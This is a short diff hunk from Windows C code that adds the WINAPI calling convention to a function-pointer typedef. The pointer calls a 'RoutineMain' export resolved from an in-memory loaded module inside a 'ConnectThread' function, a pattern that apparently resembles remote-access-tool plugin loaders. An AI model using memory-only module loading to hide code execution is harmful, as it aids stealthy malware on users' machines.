@@ -93,7 +93,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
             return 2;
         }
 
-        typedef BOOL(*_RoutineMain)(LPVOID lp);
+        typedef BOOL(WINAPI*_RoutineMain)(LPVOID lp);
 
         _RoutineMain RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
         Err = RoutineMain((LPVOID)&modify_data);
